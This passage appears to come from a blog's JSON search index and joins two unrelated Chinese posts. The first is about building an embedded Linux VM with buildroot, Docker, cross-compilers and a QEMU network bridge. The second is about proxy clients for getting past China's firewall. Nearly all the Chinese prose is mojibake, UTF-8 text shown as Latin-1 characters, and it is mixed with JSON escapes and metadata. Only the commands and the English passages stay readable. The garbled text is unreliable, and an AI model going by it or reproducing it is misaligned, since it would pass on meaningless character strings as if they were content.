menuconfigä¸€ç‚¹ç‚¹è®¾å®šå¥½çš„ã€‚ä¸è¿‡æ›´å¸¸ç”¨æ›´å¿«æ·çš„æ–¹å¼ï¼Œè¿˜æ˜¯ç›´æ¥æŒ‡å®šä¸€ä¸ªå®Œå…¨æ»¡è¶³å¦‚ä¸Šæ‰€æœ‰å‚æ•°çš„ç‰¹å®šå¹³å°ï¼Œä½¿ç”¨å…¶defconfigå³å¯ã€‚\nçœ¼ä¸‹æˆ‘éœ€è¦ä¸€ä¸ª4.9LTSç‰ˆæœ¬çš„å†…æ ¸ï¼Œå°±ä»¥æ­¤ä¸ºä¾‹äº†ã€‚\né¦–å…ˆç”±gitä»“åº“è·å–buildrootï¼Œè€Œéç”±httpä¸‹è½½ç‰¹å®šå‘è¡ŒåŒ…ã€‚è¿™æ ·åšå¸¦æ¥çš„æ–¹ä¾¿æ˜¯â€œä¸€æ¬¡ä¸‹è½½ï¼Œç»ˆç”Ÿæ›´æ–°ï¼Œéšæ—¶åˆ‡æ¢â€ï¼š\n1 git clone https://git.buildroot.net/buildroot ç”±äºå†…æ ¸ç‰ˆæœ¬å¯¹äºæ„å»ºç¯å¢ƒçš„ä¾èµ–ï¼Œå¾€å¾€å®¹æ˜“å‡ºç°å„ç§ç¯å¢ƒä¸åŒ¹é…å¯¼è‡´çš„ç¼–è¯‘å¤±è´¥ï¼Œå³æ˜¯ä½¿ç”¨buildrootä¹Ÿè‡ªåŠ¨æ„å»ºä¹Ÿä¸€æ ·ã€‚æ‰€ä»¥æˆ‘é€šå¸¸æœ‰å¦‚ä¸‹ä¸‰ç§é€’å¢çš„è§£å†³æ–¹æ¡ˆï¼š\næœ€æ–°ç‰ˆæœ¬buildrootä¸­ç›´æ¥æŒ‡å®šæ—§ç‰ˆæœ¬å†…æ ¸è¿›è¡Œæ„å»º åœ¨ä¸ç›®æ ‡å†…æ ¸ç‰ˆæœ¬åŒ¹é…çš„æ—§ç‰ˆæœ¬buildrootä¸­è¿›è¡Œæ„å»º åœ¨ä¸ ç›®æ ‡ç‰ˆæœ¬å†…æ ¸å’Œbuildrootç‰ˆæœ¬ éƒ½åŒ¹é…çš„ æ—§ç‰ˆå‘è¡Œç‰ˆçš„dockerå®¹å™¨ä¸­ è¿›è¡Œæ„å»º ç”±ä¸Šåˆ°ä¸‹ï¼Œéº»çƒ¦åº¦é€’å¢ï¼Œä½†æ„å»ºæˆåŠŸç‡ä¹Ÿé€’å¢ã€‚\nè¿™é‡Œé€‰å–æ–¹æ¡ˆäºŒç»§ç»­è¿›è¡Œæ¼”ç¤ºã€‚\næ¥æ­¤æŸ¥è¯¢åˆ°Linux Kernel 4.9 LTSçš„å‘å¸ƒæ—¥æœŸï¼šhttps://en.wikipedia.org/wiki/Linux_kernel_version_history\n2016å¹´12æœˆã€‚å—¯ï¼Œçœ‹çœ‹åŒæ—¶æœŸçš„buildrootç‰ˆæœ¬æœ‰ï¼š\n1 2 3 4 5 âœ buildroot git:(master) git switch 2012.11.x 2016.08.x 2017.08.x 2018.08.x 2019.08.x 2020.08.x 2021.08.x next 2013.08.x 2016.11.x 2017.11.x 2018.11.x 2019.11.x 2020.11.x 2021.11.x 2015.08.x 2017.02.x 2018.02.x 2019.02.x 2020.02.x 2021.02.x 2022.02.x 2015.11.x 2017.05.x 2018.05.x 2019.05.x 2020.05.x 2021.05.x master æ™šäºå†…æ ¸å‘å¸ƒä¸”æœ€è´´è¿‘çš„æ˜¯2017.02.xï¼Œswitchè¿‡å»ï¼š\n1 2 3 âœ buildroot git:(master) git switch 2017.02.x Branch \u0026#39;2017.02.x\u0026#39; set up to track remote branch \u0026#39;2017.02.x\u0026#39; from \u0026#39;origin\u0026#39;. Switched to a new branch \u0026#39;2017.02.x\u0026#39; ç”±äºæˆ‘éœ€è¦çš„ç›®æ ‡å¹³å°æ˜¯aarch64çš„virtï¼Œæ•…æœç´¢buildrootæä¾›çš„é»˜è®¤é…ç½®defconfigå¹¶ä½¿ç”¨ã€‚æ¥ç€makeå¼€å§‹æ„å»ºå³å¯ï¼š\n1 2 3 4 5 6 âœ buildroot git:(2017.02.x) ls configs | grep qemu | grep aarch qemu_aarch64_virt_defconfig âœ buildroot git:(2017.02.x) make qemu_aarch64_virt_defconfig â€¦â€¦ âœ buildroot git:(2017.02.x) make â€¦â€¦ å–å‡ æ¯å’–å•¡çš„æ—¶é—´ï¼ˆå…·ä½“æ˜¯å‡ æ¯å–å†³äºä½ hostçš„é…ç½®ä¸ç½‘ç»œç¯å¢ƒï¼‰ï¼Œå°±èƒ½åœ¨outputä¸­æ‹¿åˆ°æ‰€æœ‰çš„ç»“æœï¼šç¼–è¯‘å·¥å…·é“¾ã€å†…æ ¸ã€é“¾æ¥åº“ã€rootfsã€å¯å¼•å¯¼ç£ç›˜é•œåƒã€qemuè™šæ‹Ÿæœºä¸€é”®å¯åŠ¨è„šæœ¬â€¦â€¦\nâ˜•ï¸â˜•ï¸â˜•ï¸â€¦â€¦\nå¥½è¯¶ï¼å±…ç„¶åˆå¤±è´¥äº†ğŸ˜©ğŸ‘‡\n1 make: *** [package/pkg-generic.mk:219: /buildroot/output/build/host-m4-1.4.18/.stamp_built] Error 2 æ‰€ä»¥è¿˜å¾—æ¥ç€å†™ã€‚å¯åŠ¨æ–¹æ¡ˆä¸‰ï¼Œå‡†å¤‡docker containerï¼š\n1 2 3 4 5 6 7 8 9 10 11 âœ ~ docker pull ubuntu:18.04 18.04: Pulling from library/ubuntu 09db6f815738: Pull complete Digest: sha256:478caf1bec1afd54a58435ec681c8755883b7eb843a8630091890130b15a79af Status: Downloaded newer image for ubuntu:18.04 docker.io/library/ubuntu:18.04 âœ ~ docker run -it -v /host_path:/guest_path ubuntu:18.04 /bin/bash root@c1c9ce358373:/# exit âœ ~ docker start c1; docker exec -it c1 /bin/bash c1 root@c1c9ce358373:/# å¥½äº†ï¼Œè¿™ä¸‹buildrootä¹Ÿåœ¨è€ç¯å¢ƒå†…äº†ï¼Œå†æ¬¡é‡å¤ä¸Šè¿°æ­¥éª¤å³å¯ã€‚\næ¢ç”¨ubuntu18.04æœç„¶æˆåŠŸäº†ã€\nå¦‚æœä½ å’Œæˆ‘ä¸€æ ·æ‡’å¾—å¼„å…±äº«æ–‡ä»¶å¤¹ï¼Œå°±ç›´æ¥æ¥/var/lib/docker/overlay2ä¸­å–è´§å§ã€‚æ¯•ç«Ÿdockeråªæ˜¯åœ¨æ–‡ä»¶ç³»ç»Ÿå±‚åšäº†è™šæ‹ŸåŒ–ï¼Œç”šè‡³è¿è™šæ‹Ÿç£ç›˜éƒ½ä¸éœ€è¦ï¼Œç›´æ¥åœ¨hostçš„æ–‡ä»¶ç³»ç»Ÿä¸­å­˜æ”¾äº†guestçš„æ–‡ä»¶ã€‚\n1 2 3 4 5 6 7 8 9 10 âœ ~ cd /var/lib/docker/overlay2 âœ overlay2 du -h -d 1 7.8G ./d8ef00627999edcb9a6fee28d49bf9312f3bb56ca62101ce8850b3b406c4c498 40K ./d8ef00627999edcb9a6fee28d49bf9312f3bb56ca62101ce8850b3b406c4c498-init 69M ./cd42e49af35fa4606d2b1f029e089cc3caca7658ff0b6e2bca950dc7379318ee 16K ./l 7.9G . âœ overlay2 cd d8ef00627999edcb9a6fee28d49bf9312f3bb56ca62101ce8850b3b406c4c498/merged/ âœ merged ls bin boot buildroot dev etc home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var æ¥ç€è¿›å…¥buildroot/outputå–è´§å³å¯ã€‚è™½ç„¶å…¶ä¸­å·²æœ‰4.9.6çš„å†…æ ¸äº†ï¼Œä¸è¿‡æˆ‘éœ€è¦çš„æ˜¯ç”±æ­¤å¾—åˆ°çš„ç¼–è¯‘å·¥å…·é“¾ï¼Œä»¥ä¾¿ç¼–è¯‘è‡ªè¡Œå®šåˆ¶çš„4.9ç‰ˆæœ¬å†…æ ¸ã€‚ï¼ˆæ—§ç‰ˆå†…æ ¸éœ€è¦æ—§ç‰ˆå·¥å…·é“¾ç¼–è¯‘ï¼‰\næ‰‹åŠ¨æ¡£ ç¼–è¯‘å·¥å…·é“¾ è¿™ä¸ªå¥½è¯´ï¼Œæ–¹æ‰Easymodeé‡Œä¸æ˜¯åˆšå¥½åšäº†ä¸€ä¸ªå˜›ã€‚buildrootæ„å»ºå¥½äº†æ‰€æœ‰targetç›®æ ‡ï¼Œè‡ªç„¶ä¹Ÿä¸ºæ­¤ç”Ÿæˆäº†å®Œæ•´çš„hostæ„å»ºå·¥å…·é“¾ã€‚\nè‹¥ç›®æ ‡ä¸ºæ—§ç‰ˆæœ¬å†…æ ¸ï¼Œåˆ™éœ€è¦æ—§ç‰ˆæœ¬å·¥å…·é“¾ï¼Œæ„å»ºæ–¹å¼åœ¨å¦ä¸€ç¯‡æ–‡ç« ä¸­æœ‰è®°å½•ï¼šhttps://cerr.cc/post/cross-debug-old-version-kernel-using-qemu-system/\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 âœ buildroot git:(master) ls arch CHANGES configs dl linux output support utils board Config.in COPYING docs Makefile package system boot Config.in.legacy DEVELOPERS fs Makefile.legacy README toolchain âœ buildroot git:(master) ls output build host images staging target âœ buildroot git:(master) ls output/build buildroot-config host-meson-0.62.1 buildroot-fs host-mpc-1.2.1 build-time.log host-mpfr-4.1.0 busybox-1.35.0 host-ninja-1.10.2.g51db2.kitware.jobserver-1 host-acl-2.3.1 host-openssl host-attr-2.5.1 host-patchelf-0.9 host-autoconf-2.71 host-pcre-8.45 host-autoconf-archive-2021.02.19 host-pixman-0.40.0 host-automake-1.16.5 host-pkgconf-1.6.3 host-binutils-2.37 host-python3-3.10.4 host-bison-3.8.2 host-python-setuptools-62.1.0 host-cmake-3.18.6 host-qemu-7.0.0 host-dtc-1.6.1 host-skeleton host-e2fsprogs-1.46.5 host-util-linux-2.38 host-expat-2.4.7 host-zlib host-fakeroot-1.26 ifupdown-scripts host-flex-2.6.4 initscripts host-gcc-final-10.3.0 linux-5.15.18 host-gcc-initial-10.3.0 linux-headers-5.15.18 host-gettext locales.nopurge host-gettext-tiny-0.3.2 packages-file-list-host.txt host-gmp-6.2.1 packages-file-list-staging.txt host-kmod-29 packages-file-list.txt host-libffi-3.4.2 skeleton host-libglib2-2.70.4 skeleton-init-common host-libopenssl-1.1.1o skeleton-init-sysv host-libtool-2.4.6 toolchain host-libzlib-1.2.12 toolchain-buildroot host-m4-1.4.19 uclibc-1.0.40 host-makedevs urandom-scripts âœ buildroot git:(master) ls output/host aarch64-buildroot-linux-uclibc bin doc etc include lib lib64 libexec sbin share usr var âœ buildroot git:(master) ls output/target bin etc lib64 media opt root sbin THIS_IS_NOT_YOUR_ROOT_FILESYSTEM usr dev lib linuxrc mnt proc run sys tmp var âœ buildroot git:(master) ls output/images Image rootfs.ext2 rootfs.ext4 start-qemu.sh âœ buildroot git:(master) ls output/staging bin dev etc lib lib64 media mnt opt proc root run sbin sys tmp usr âœ buildroot git:(master) file output/staging output/staging: symbolic link to /f/software/buildroot/output/host/aarch64-buildroot-linux-uclibc/sysroot output/hostä¸‹å³æ˜¯é¢å‘buildrootæ„å»ºå‰è®¾å®šçš„ç›®æ ‡å¹³å°çš„ç¼–è¯‘å·¥å…·é“¾ã€‚\nç¼–è¯‘å·¥å…·é“¾çš„å‘½åéµå¾ª arch-vendor-(os-)abi çš„æ ¼å¼\nåŒæ—¶ä¹Ÿå¯ä»¥ç›´æ¥ä»è¿™äº›åœ°æ–¹ä¸‹è½½åˆ°ï¼š\narm cortex-a:The GNU Toolchain for the Cortex-A Family Downloads\narm cortex-m:GNU Arm Embedded Toolchain Downloads\nLinaro:arm:https://www.linaro.org/downloads/\nrisc-v:https://github.com/riscv/riscv-gnu-toolchain/releases\nmips:https://www.mips.com/develop/tools/compilers/linux-toolchain/\nuclibc:https://www.uclibc.org/downloads/binaries/\nhttp://download.ronetix.info/toolchains/\nè‹¥å®åœ¨æ²¡æœ‰å•¥ç‰¹æ®Šéœ€æ±‚ï¼Œ apt install gcc-aarch64-linux-gnuå¤§éƒ¨åˆ†æƒ…å†µä¸‹ä¹Ÿèƒ½ç›´æ¥è§£å†³é—®é¢˜ã€‚\nOS/ABIçš„åŒ¹é… é€šå¸¸æƒ…å†µä¸‹ï¼Œé€‰å–ç¼–è¯‘äº¤å‰ç¼–è¯‘å·¥å…·é“¾æ—¶ï¼ŒæŒ‡ä»¤é›†ã€å¹³å°ä¹‹ç±»çš„å†…å®¹æ˜¯ä¸å®¹æ˜“å¼„é”™çš„ã€‚ä½† OS/ABI å´æ˜¯ä¸ªå®¹æ˜“é€ æˆæ•…éšœçš„ç‚¹ã€‚\nä¸¾ä¾‹æ¥è®²ï¼Œåœ¨æˆ‘ä¸€æ¬¡å¯¹libnvram.soçš„ç¼–è¯‘æ—¶ï¼Œå¾—åˆ°çš„ç›®æ ‡ELFæ–‡ä»¶ä¸ºï¼š\n1 2 3 4 5 6 7 8 9 10 11 ~$ file libnvram.so libnvram.so: ELF 32-bit LSB shared object, ARM, version 1 (ARM), dynamically linked, not stripped ~$ armv5l-readelf -h libnvram.so ELF Header: Magic: 7f 45 4c 46 01 01 01 61 00 00 00 00 00 00 00 00 Class: ELF32 Data: 2\u0026#39;s complement, little endian Version: 1 (current) OS/ABI: ARM ...... ä½¿ç”¨è¯¥è‡ªè¡Œç¼–è¯‘çš„libnvram.soå¯¼è‡´æŠ¥é”™ï¼š\n1 /sbin/init: error while loading shared libraries: /lib/libnvram.so: ELF file OS ABI invalid è€ŒåŸç‰ˆæ— æ•…éšœçš„libnvram.soä¸ºï¼š\n1 2 3 4 5 6 7 8 9 10 11 ~$ file libnvram.so libnvram.so: ELF 32-bit LSB shared object, ARM, EABI5 version 1 (SYSV), dynamically linked, not stripped ~$ armv5l-readelf -h libnvram.so ELF Header: Magic: 7f 45 4c 46 01 01 01 00 00 00 00 00 00 00 00 00 Class: ELF32 Data: 2\u0026#39;s complement, little endian Version: 1 (current) OS/ABI: UNIX - System V ...... å¯ä»¥çœ‹åˆ°ï¼Œä¸¤è€…çš„OS/ABIï¼Œä¸€ä¸ªæ˜¯ARMï¼Œä¸€ä¸ªæ˜¯UNIX - System V\nABIæè¿°åº”ç”¨ç¨‹åºä¸æ“ä½œç³»ç»Ÿã€åº”ç”¨ç¨‹åºä¸åº“ã€åº”ç”¨ç¨‹åºçš„ç»„æˆéƒ¨åˆ†ä¹‹é—´çš„ä½å±‚æ¥å£ã€‚ABIå…è®¸ç¼–è¯‘å¥½çš„ç›®æ ‡ä»£ç åœ¨ä½¿ç”¨å…¼å®¹ABIçš„ç³»ç»Ÿä¸­æ— éœ€æ”¹åŠ¨å°±èƒ½è¿è¡Œ\nå¯¼è‡´è¿™ä¸€ç»“æœçš„åŸå› æ˜¯ï¼šä½¿ç”¨OABIç¼–è¯‘å·¥å…·é“¾ç¼–è¯‘å‡ºçš„ç»“æœä¸ºOS/ABI: ARMï¼Œè€Œä½¿ç”¨EABIç¼–è¯‘å·¥å…·é“¾ç¼–è¯‘å‡ºçš„ç»“æœä¸ºOS/ABI: UNIX - System Vã€‚å…³äºOABIä¸EABIçš„åŒºåˆ«ï¼Œå‚è§ï¼šhttps://docs.embeddedts.com/EABI_vs_OABI\næ•…æ¢ç”¨æ ‡è¯†äº†eabiçš„å·¥å…·é“¾é‡æ–°ç¼–è¯‘å³è§£å†³äº†è¯¥é—®é¢˜ã€‚\nKernel Linuxæºç ç»“æ„ æ‰‹åŠ¨æ„å»ºå†…æ ¸å‰ï¼Œå…ˆäº†è§£ä¸‹å†…æ ¸æºç çš„æ–‡ä»¶æ ‘ç»“æ„ã€‚ä»¥2022/6/1çš„linuxæºç ä¸ºä¾‹ï¼š\n1 2 3 4 âœ linux git:(master) ls arch COPYING Documentation include Kbuild lib Makefile README security usr block CREDITS drivers init Kconfig LICENSES mm samples sound virt certs crypto fs ipc kernel MAINTAINERS net scripts tools arch The arch subdirectory contains all of the architecture specific kernel code. It has further subdirectories, one per supported architecture, for example i386 and alpha. include The include subdirectory contains most of the include files needed to build the kernel code. It too has further subdirectories including one for every architecture supported. The /include/asm subdirectory is a soft link to the real include directory needed for this architecture, for example /include/asm-i386. To change architectures you need to edit the kernel makefile and rerun the Linux kernel configuration program. init This directory contains the initialization code for the kernel and it is a very good place to start looking at how the kernel works. mm This directory contains all of the memory management code. The architecture specific memory management code lives down in /arch/*/mm/, for example /arch/i386/mm/fault.c. drivers All of the system\u0026rsquo;s device drivers live in this directory. They are further sub-divided into classes of device driver, for example block. ipc This directory contains the kernels inter-process communications code. modules This is simply a directory used to hold built modules. fs All of the file system code. This is further sub-divided into directories, one per supported file system, for example vfat and ext2. kernel The main kernel code. Again, the architecture specific kernel code is in /arch/*/kernel. net The kernel\u0026rsquo;s networking code. lib This directory contains the kernel\u0026rsquo;s library code. The architecture specific library code can be found in /arch/*/lib/. scripts This directory contains the scripts (for example awk and tk scripts) that are used when the kernel is configured. Linuxæ„å»ºç³»ç»Ÿ åŒæ—¶éœ€è¦å…ˆäº†è§£ä¸‹ .configã€defconfigã€Kconfig\nhttps://stackoverflow.com/questions/41885015/what-exactly-does-linux-kernels-make-defconfig-do https://www.linuxjournal.com/content/kbuild-linux-kernel-build-system æ€»çš„æ¥è¯´ï¼Œthe Linux Kernel Build System has four main components:\nConfig symbols: compilation options that can be used to compile code conditionally in source files and to decide which objects to include in a kernel image or its modules. Kconfig files: define each config symbol and its attributes, such as its type, description and dependencies. Programs that generate an option menu tree (for example, make menuconfig) read the menu entries from these files. .config file: stores each config symbol\u0026rsquo;s selected value. You can edit this file manually or use one of the many make configuration targets, such as menuconfig and xconfig, that call specialized programs to build a tree-like menu and automatically update (and create) the .config file for you. Makefiles: normal GNU makefiles that describe the relationship between source files and the commands needed to generate each make target, such as kernel images and modules. è‡³äºdefconfigï¼Œåˆ™ä¸€èˆ¬ç”±å¹³å°å‚å•†æä¾›ï¼Œé‡Œé¢å«æœ‰äº†ç›®æ ‡å¹³å°ç›¸å…³çš„ä¸€äº›é»˜è®¤å‚æ•°ï¼Œå†…æ ¸ç¼–è¯‘ç”¨åš.configçš„å‚è€ƒã€‚åŒæ—¶éµå®ˆå¦‚ä¸‹è§„åˆ™ï¼š\nif option is mentioned in defconfig, build system puts that option into .config with value chosen in defconfig if option isn\u0026rsquo;t mentioned in defconfig, build system puts that option into .config using its default value, specified in corresponding Kconfig ç”±æ­¤ç¡®ä¿æ„å»ºå‡ºçš„å†…æ ¸ä¸ç‰¹å®šå¹³å°åŒ¹é…ã€‚\ndefconfigæ–‡ä»¶å­˜æ”¾äºarch/*/configs/è·¯å¾„ä¸‹ï¼Œå¦‚ï¼š\n1 2 3 4 5 âœ linux git:(master) ls arch/arm/configs/ am200epdkit_defconfig gemini_defconfig multi_v5_defconfig s5pv210_defconfig aspeed_g4_defconfig h3600_defconfig multi_v7_defconfig sama5_defconfig aspeed_g5_defconfig h5000_defconfig mv78xx0_defconfig sama7_defconfig ...... è‡³äºmake defconfigç©¶ç«Ÿå¹²äº†å•¥ï¼Œå¯ä»¥ä½¿ç”¨V=1å‚æ•°æŸ¥çœ‹ï¼š\n1 make V=1 defconfig å¼€å§‹æ„å»º ç°æ¥æ­¤æŒ‘é€‰ä¸­æ„çš„å†…æ ¸ç‰ˆæœ¬ï¼šhttps://en.wikipedia.org/wiki/Linux_kernel_version_history\næˆ‘è¿™è¾¹ä»¥5.4ç‰ˆæœ¬å†…æ ¸ä¸ºä¾‹ç»§ç»­å®éªŒï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 git clone https://github.com/torvalds/linux.git # 1day mirror git clone https://gitee.com/mirrors/linux_old1.git cd linux # åˆ‡æ¢åˆ°ç‰¹å®šç‰ˆæœ¬ git checkout v5.4 # åˆ›å»ºç›®æ ‡æ–‡ä»¶å¤¹ mkdir build # å¯¼å…¥aarch64çš„defconfig make ARCH=arm64 O=./build defconfig # è‡ªå®šä¹‰é…ç½® make O=./build menuconfig ç”±äºæˆ‘ä»¬çš„ç›®æ ‡å¹³å°æ˜¯QEMU Virtioï¼Œæ•…éœ€è¦äºmake menuconfigä¸­å¯ç”¨ç›¸åº”é…ç½®ï¼šVIRTIO_BLK, SCSI_BLK, VIRTIO_NET, HVC_DRIVER, VIRTIO_CONSOLE, VIRTIO, VIRTIO_MMIOã€‚è¯¦ç»†çš„Kernel configå‚è€ƒä¹Ÿå¯ä»¥ä»buildroot/board/qemuä¸­æ‰¾åˆ°ã€‚\nè‡³äºVirtioå…·ä½“æ˜¯ä¸ªå•¥ï¼Œå‚è€ƒï¼š\nhttps://wiki.libvirt.org/page/Virtio https://wiki.osdev.org/Virtio https://www.linux-kvm.org/page/Virtio https://zhuanlan.zhihu.com/p/68154666 https://www.anquanke.com/post/id/224001 https://developer.ibm.com/articles/l-virtio/ åœ¨make menuconfigä¸­å¯ç”¨è·¯å¾„å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 Device Drivers ---\u0026gt; [*] Virtio drivers Device Drivers ---\u0026gt; [*] Network device support ---\u0026gt; \u0026lt;*\u0026gt; Virtio network driver Device Drivers ---\u0026gt; [*] Block devices ---\u0026gt; \u0026lt;*\u0026gt; Virtio block driver å¦‚æƒ³è¦æ‰‹åŠ¨æ·»åŠ å†…æ ¸é©±åŠ¨ï¼Œå‚è€ƒï¼šhttps://stackoverflow.com/questions/11710022/adding-new-driver-code-to-linux-source-code\nTip: If you want a sample of linux.config for a specific platform, take a look at buildroot/board\né…ç½®å®Œæ¯•ï¼Œå¼€å§‹ç¼–è¯‘ï¼š\n1 make O=./build CROSS_COMPILE=aarch64-linux-gnu- -j`nproc` æ³¨æ„å°† aarch64-linux-gnu- æ¢æˆä½ å½“å‰çš„ç¼–è¯‘å·¥å…·é“¾è·¯å¾„\nå¾—åˆ°çš„Imageå’Œvmlinuxè·¯å¾„ä¸ºï¼š\n1 2 3 4 âœ linux git:(219d54332a09) find . -name Image ./build/arch/arm64/boot/Image âœ linux git:(219d54332a09) find . -name vmlinux ./build/vmlinux é€šè¿‡qemu-systemè¿è¡Œ ç½‘æ¡¥çš„é¢„é…ç½® åç»­hostäºqemu-systemä¸­çš„guestå°†é€šè¿‡ç½‘æ¡¥è¿æ¥ï¼Œæ•…å…ˆäºhostä¸­é…ç½®ç½‘æ¡¥ã€‚\né¦–å…ˆå‡†å¤‡ç½‘æ¡¥ä¸tun/tapè™šæ‹Ÿç½‘å¡ï¼š\nåˆ›å»ºç½‘æ¡¥br0ï¼š\n1 sudo brctl addbr br0 ä¸ºå½“å‰ç”¨æˆ·åˆ›å»ºtun/tapè™šæ‹Ÿç½‘å¡tap0ï¼š\n1 tunctl -t tap0 -u ${USER} è‹¥å‘ç°brctlä¸tunctlå‘½ä»¤æœªæ‰¾åˆ°ï¼Œåˆ™éœ€è¦å…ˆå®‰è£…ç›¸åº”è½¯ä»¶åŒ…ã€‚è¿™é‡Œæ¨èä¸€ä¸ªç½‘ç«™ï¼Œå¯ä»¥æ–¹ä¾¿çš„æŸ¥è¯¢ä¸€ä¸ªå‘½ä»¤åœ¨ä¸åŒè½¯ä»¶æºä¸­å¯¹åº”çš„åŒ…åï¼šhttps://command-not-found.com/ï¼ˆä¸“æ²»command not found 20 å¹´ï¼‰\n","date":"2022-05-10T20:59:43+08:00","image":"https://s2.loli.net/2022/05/08/2DqjsbwNpdUM4XA.jpg","permalink":"https://cerr.cc/post/%E6%9E%84%E5%BB%BA%E4%B8%8E%E8%BF%90%E8%A1%8C%E5%B5%8C%E5%85%A5%E5%BC%8Flinux%E8%99%9A%E6%8B%9F%E6%9C%BA/","title":"æ„å»ºä¸è¿è¡ŒåµŒå…¥å¼linuxè™šæ‹Ÿæœº"},{"content":" å½“æˆ‘è€äº†ï¼Œå›é¡¾ä¸€ç”Ÿï¼Œå°±ä¼šå‘è§‰ï¼Œæˆ‘ä¸‰åˆ†ä¹‹ä¸€çš„ç”Ÿå‘½ï¼Œéƒ½æµªè´¹åœ¨å’ŒGFWä½œæ–—äº‰ä¸Šäº†ã€‚\nå‘œå‘¼ï¼ä½•ç­‰å®ä¼Ÿå•Šï¼ä¸¤åƒå¹´å¤šå‰çš„å·¨çŸ³ï¼Œç Œå°±ç§¦å¸å›½çš„åšä¸å¯æ‘§ï¼›ä»Šæ—¥é‚£æ—¥å¤œå‘¼å•¸çš„æœåŠ¡å™¨é›†ç¾¤ï¼Œå½°æ˜¾å…±å’Œå›½éå‡¡çš„åˆ¶åº¦è‡ªä¿¡ã€‚ğŸ˜«\nTop-level solution selection In terms of the ways I have tried myself:\nUse a VPN application Rent an overseas server Subscribe to an airport service The last option strikes the best balance between price and convenience.\nAs for the first two option:\nBeware of phishing High cost in time or money Stability is a concern ä¸ªäººå®¢æˆ·ç«¯è§£å†³æ–¹æ¡ˆ å…·ä½“ä½¿ç”¨æ–¹é¢å°±å¤§ç™½è¯è®²äº†\nåƒæœºä½¬å‡ºèº«çš„æˆ‘ï¼Œæ‰‹é‡Œç¡¬ä»¶è®¾å¤‡çš„æ•°é‡ç»å¸¸ä»¤å¾—æ—äººæƒŠå¼‚ã€‚å³ä½¿åˆ°äº†æ¸æ¸é€€çƒ§çš„ä»Šå¤©ï¼Œæˆ‘æ‰‹ä¸­ä¹Ÿæ˜¯ä¿æœ‰äº†å„ä¸ªä¸»æµæ“ä½œç³»ç»Ÿå¹³å°çš„ç‰©ç†æœºã€‚\né¡¶å±‚åè®®æ–¹é¢ï¼Œv2rayå’Œssréƒ½æœ‰ä½¿ç”¨ï¼Œæœªå°è¯•è¿‡è‡ªè¡Œç¼–å†™æˆ–æ”¹è¿›åŠ å¯†åè®®ã€‚æœåŠ¡ç«¯ä¸€å¹´200å·¦å³çš„æœºåœºå…¨å¤Ÿç”¨äº†ã€‚å®¢æˆ·ç«¯ç›®å‰ä½¿ç”¨æ–¹æ¡ˆå¦‚ä¸‹ï¼š\nWindows v2rayNGï¼šhttps://github.com/2dust/v2rayN Linux v2rayAï¼šhttps://github.com/v2rayA/v2rayA MacOS ClashXï¼šhttps://github.com/yichengchen/clashX iOS shadowrocketï¼šå¤–åŒºAPP Storeä¸‹è½½ Android v2rayNGï¼šhttps://github.com/2dust/v2rayNG ä»£ç†å±‚æ¬¡ åœ¨TCP/IPåè®®æ ˆçš„ä¸åŒå±‚è®¾å®šçš„ä»£ç†ï¼Œä¼šå¯¹ç³»ç»Ÿä¸åº”ç”¨äº§ç”Ÿä¸åŒå½±å“ã€‚\nè®¸å¤šVPNè½¯ä»¶éƒ½æ˜¯åˆ©ç”¨äº†tun/tapåˆ›å»ºäº†è™šæ‹Ÿç½‘å¡ï¼Œå°†ç³»ç»Ÿä¸­æ‰€æœ‰æµé‡ç›´æ¥é€šè¿‡è™šæ‹Ÿç½‘å¡è½¬å‘è‡³ä»£ç†æœåŠ¡å™¨ã€‚è¿™ç§æ–¹æ¡ˆä»£ç†äºé“¾æ¥å±‚ï¼Œå…¨å±€ä»£ç†æ•ˆæœå¥½ã€‚ä½†åŒæ—¶ç”±æ­¤å¸¦æ¥çš„ç¼ºç‚¹æ˜¯ï¼Œä¸€äº›æˆ‘ä»¬ä¸æƒ³è¢«ä»£ç†çš„æµé‡ä¹Ÿä¼šç»ç”±ä»£ç†æœåŠ¡å™¨è½¬å‘äº†ã€‚éƒ¨åˆ†SSRã€v2rayå®¢æˆ·ç«¯æœ‰tunæ¨¡å¼ï¼Œä¹Ÿæ˜¯åŒæ ·çš„é“ç†ã€‚\nå†è€…å°±æ˜¯äºæ“ä½œç³»ç»Ÿå±‚é¢é…ç½®ç³»ç»Ÿä»£ç†ï¼Œè¿™æ ·ä¸€æ¥æ‰€ä»¥ä¼šéµå¾ªç³»ç»Ÿä»£ç†è®¾ç½®çš„åº”ç”¨éƒ½ä¼šè¢«ä»£ç†ã€‚ä½†åŒæ—¶ä¹Ÿä¼šæœ‰å…¶å®ƒä¸€äº›ä¸éµå®ˆç³»ç»Ÿä»£ç†çš„åº”ç”¨ã€‚ä¸¾ä¾‹æ¥è®²ï¼Œchromeé»˜è®¤æ˜¯èµ°ç³»ç»Ÿä»£ç†çš„ï¼Œè€Œfirefoxåˆ™éœ€æ‰‹åŠ¨é…ç½®é€‰æ‹©ä»£ç†æ–¹æ¡ˆã€‚å¦‚å³å›¾æ˜¯Windows11çš„ç³»ç»Ÿä»£ç†è®¾ç½®ï¼Œçº¢æ¡†å†…çš„æ–‡å­—è¯´æ˜äº†å…¶ä¸VPNä½¿ç”¨è™šæ‹Ÿç½‘å¡çš„æ–¹æ¡ˆå¹¶ä¸é‡å 